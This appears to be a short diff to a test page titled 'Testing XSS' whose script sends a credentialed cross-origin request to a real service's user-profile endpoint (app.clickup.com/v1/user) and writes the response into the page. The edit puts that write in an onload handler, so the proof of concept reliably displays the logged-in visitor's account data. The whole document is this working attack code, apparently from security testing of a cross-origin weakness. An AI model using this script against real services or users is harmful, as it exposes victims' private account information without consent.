@@ -8,11 +8,14 @@ div {text-align: center;}
     <title>Testing XSS</title>
     <body>
       <script>
-        var xhr = new XMLHttpRequest();
-        xhr.open('GET', "https://app.clickup.com/v1/user");
-        xhr.withCredentials = true;        
-        xhr.send();
-        document.write(this.response);
+var xhr = new XMLHttpRequest();
+xhr.open('GET', "https://app.clickup.com/v1/user");
+xhr.withCredentials = true;
+xhr.onload = function () {
+    document.write(this.response)
+};
+xhr.send();
+        
 </script>
     </body>
   </head>
